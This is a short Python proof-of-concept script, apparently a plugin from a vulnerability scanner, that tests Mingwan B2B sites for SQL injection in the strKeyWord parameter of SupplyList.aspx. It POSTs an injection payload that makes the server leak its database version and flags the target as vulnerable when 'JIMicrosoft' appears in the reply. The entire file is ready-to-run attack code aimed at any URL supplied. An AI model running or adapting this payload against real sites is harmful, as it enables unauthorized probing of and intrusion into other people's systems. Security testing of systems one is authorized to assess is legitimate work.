#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 铭万B2B SupplyList SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0104430
author: Lucifer
description: 文件SupplyList.aspx中,参数strKeyWord存在SQL注入。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['铭万B2B SupplyList SQL注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "strKeyWord":"'AnD 1=ChAr(74)+ChAr(73)+@@VeRsIoN AnD '%'='"
        }
        payload = "/Supply/SupplyList.aspx?ChangeType=0"
        vulnurl = url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"JIMicrosoft" in req.text:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
